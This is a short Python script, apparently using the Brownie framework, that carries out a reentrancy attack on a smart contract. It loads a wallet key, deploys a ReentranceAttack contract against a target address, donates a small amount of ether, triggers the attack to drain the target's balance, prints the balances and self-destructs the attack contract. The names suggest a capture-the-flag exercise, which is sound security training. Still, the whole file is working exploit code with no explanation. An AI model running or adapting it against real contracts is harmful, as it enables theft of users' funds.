from brownie import accounts, config, ReentranceAttack, interface
def main(address):
    hacker = accounts.add(config['wallets']['from_key'])
    target = interface.ReentranceInterface(address)
    attack = ReentranceAttack.deploy(address, '0.001 ether', {'from': hacker})
    target.donate(attack.address, {'from': hacker, 'amount': '0.001 ether'})
    print(f'{attack.balance()}')

    attack.attack({'from': hacker, 'allow_revert': True, 'gas_limit': 600000})
    print(f'{attack.balance()}')
    attack.destroy()

